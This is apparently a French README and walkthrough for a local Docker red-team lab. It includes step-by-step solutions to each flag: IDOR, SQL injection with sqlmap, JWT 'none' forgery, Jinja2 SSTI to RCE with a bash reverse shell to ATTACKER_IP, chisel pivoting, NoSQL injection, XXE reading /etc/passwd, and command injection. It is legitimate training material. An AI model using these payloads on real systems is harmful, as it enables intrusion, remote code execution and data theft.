# Lab SDV M2 — Red Team Advanced 2026

## Prérequis

- **Docker** ≥ 20.10 ([installation](https://docs.docker.com/engine/install/))
- **Docker Compose** ≥ 2.0 (inclus avec Docker Desktop)
- **4 Go RAM** libre minimum

---

## Mise en place — étape par étape

### 1. Vérifier Docker

```bash
docker --version
docker compose version
# ou : docker-compose --version
```

Si Docker n'est pas lancé :
```bash
sudo systemctl start docker
```

### 2. Lancer le lab

```bash
cd lab
chmod +x setup.sh
./setup.sh start
```

Le script va :
1. Vérifier Docker et les ports
2. Construire les images
3. Démarrer les 4 conteneurs (MySQL, MongoDB, Webapp, Interne)
4. Attendre l'initialisation
5. Afficher le résumé

### 3. Vérifier que tout fonctionne

```bash
# Test de l'application
curl http://localhost:8080/

# Voir l'état
./setup.sh status

# Voir les logs
./setup.sh logs
```

### 4. Accéder au lab

Ouvrir **http://localhost:8080** dans le navigateur.

**Compte fourni :** `user@ecovault.com` / `User2026!`

---

## Architecture

| Conteneur        | IP interne   | Rôle                          |
|------------------|-------------|-------------------------------|
| `lab-webapp`     | 10.0.0.100  | Application Flask vulnérable  |
| `lab-mysql`      | 10.0.0.2    | Base MySQL (SQLi)             |
| `lab-mongo`      | 10.0.0.3    | Base MongoDB (NoSQLi)         |
| `lab-internal`   | 10.0.0.10   | Serveur interne (pivoting)    |

---

## Commandes utiles

| Commande | Action |
|----------|--------|
| `./setup.sh start` | Construire et lancer le lab |
| `./setup.sh stop` | Arrêter les conteneurs |
| `./setup.sh reset` | Réinitialisation complète (supprime les données) |
| `./setup.sh status` | Voir l'état des conteneurs |
| `./setup.sh logs` | Voir les logs en direct |

---

## Résolution pas à pas

### Flag 1 — IDOR (T1548)

**Endpoint :** `GET /api/profile/<id>`

```bash
# Connexion normale
curl -c cookies.txt -X POST http://localhost:8080/login \
  -d "email=user@ecovault.com&password=User2026!"

# Lire son propre profil (id=2)
curl -b cookies.txt http://localhost:8080/api/profile/2

# IDOR : lire le profil admin (id=1)
curl -b cookies.txt http://localhost:8080/api/profile/1
# → flag{admin_api_key_4a7b9c}
```

---

### Flag 2 — SQL Injection (T1190)

**Endpoint :** `GET /api/transactions?filter=<injection>`

```bash
# Test : erreur SQL
curl "http://localhost:8080/api/transactions?filter=1'"

# UNION SELECT pour extraire les tables
# (D'abord trouver le nombre de colonnes)
curl "http://localhost:8080/api/transactions?filter=1+UNION+SELECT+1,2,3,4--"

# Extraire le contenu de la table users
curl "http://localhost:8080/api/transactions?filter=1+UNION+SELECT+id,CONCAT(email,':',password),role,created_at+FROM+users--"

# Avec sqlmap
sqlmap -u "http://localhost:8080/api/transactions?filter=1" \
  --dbms=mysql --dump -T users
```

---

### Flag 3 — Auth Bypass JWT (T1078)

```bash
# 1. Se connecter normalement pour avoir un JWT
curl -c cookies.txt http://localhost:8080/login \
  -d "email=user@ecovault.com&password=User2026!"

# 2. Examiner le JWT sur https://jwt.io
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"user_id":2,"email":"user@ecovault.com","role":"user","kid":"key1"}

# 3. Récupérer la clé publique RSA
curl http://localhost:8080/api/jwt-info

# 4. Attaque "none algorithm"
# Modifier header → {"alg":"none","typ":"JWT"}
# Modifier payload → role:"admin"
# Token forgé (sans signature) :
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImFkbWluQGVjb3ZhdWx0LmNvbSIsInJvbGUiOiJhZG1pbiJ9.

# 5. Ou : kid injection vers /dev/null
# Header: {"alg":"HS256","typ":"JWT","kid":"/dev/null"}
# Signer avec une clé vide → bypass

# 6. Ou : SQLi dans le login
curl -c cookies.txt http://localhost:8080/login \
  -d "email=admin@ecovault.com'--&password=x"
```

---

### Flag 4 — SSTI → RCE (T1190 → T1059.003)

**Endpoint :** `POST /admin/templates` (accès admin requis)

```bash
# 1. Se connecter en admin (JWT forgé du Flag 3)
# 2. Dans le champ "Nom du template", tester SSTI
template_name={{7*7}}
# → "Prévisualisation : 49" (SSTI confirmé !)

# 3. Lire des variables
template_name={{config}}

# 4. RCE via Jinja2
template_name={{lipsum.__globals__.os.popen('id').read()}}

# 5. Reverse shell
template_name={{lipsum.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read()}}
```

---

### Flag 5 — Pivoting (T1021)

```bash
# 1. Obtenir un reverse shell (via SSTI RCE du Flag 4)
# 2. Scanner le réseau interne
for i in $(seq 1 20); do ping -c 1 -W 1 10.0.0.$i | grep "ttl="; done

# 3. Découvrir 10.0.0.10 (serveur interne HTTP + SMTP)

# 4. Pivoting avec chisel
# Sur l'attaquant :
./chisel server -p 8080 --reverse

# Sur la victime (depuis le reverse shell) :
./chisel client ATTACKER_IP:8080 R:1080:socks

# 5. Accéder au serveur interne via proxychains
proxychains curl http://10.0.0.10:8081/
# → flag{pivot_interne_reussi_2026}

# 6. SMTP
proxychains nc 10.0.0.10 25
# HELO test
# MAIL FROM: <admin@ecovault.com>
# RCPT TO: <user@ecovault.com>
# DATA
# Subject: Test
# Contenu du message.
# .
# QUIT
```

---

### Bonus — NoSQLi (T1190)

```bash
# Endpoint : POST /api/export
curl -X POST http://localhost:8080/api/export \
  -H "Content-Type: application/json" \
  -d '{"collection":"users","filter":{"password":{"$ne":""}}}'
# → flag{nosqli_mongo_2026}
```

### Bonus — XXE (T1190)

```bash
curl -X POST http://localhost:8080/api/upload-xml \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'
```

### Bonus — Command Injection (T1059.004)

```bash
curl -X POST http://localhost:8080/api/ping \
  -d "host=127.0.0.1; id"
```

---

## Dépannage

| Problème | Solution |
|----------|----------|
| Port 8080 déjà utilisé | `sudo lsof -i :8080` puis `sudo kill <PID>` |
| MySQL ne démarre pas | `./setup.sh reset` |
| L'application ne répond pas | Attendre 30s (MySQL s'initialise) |
| Permission denied sur setup.sh | `chmod +x setup.sh` |
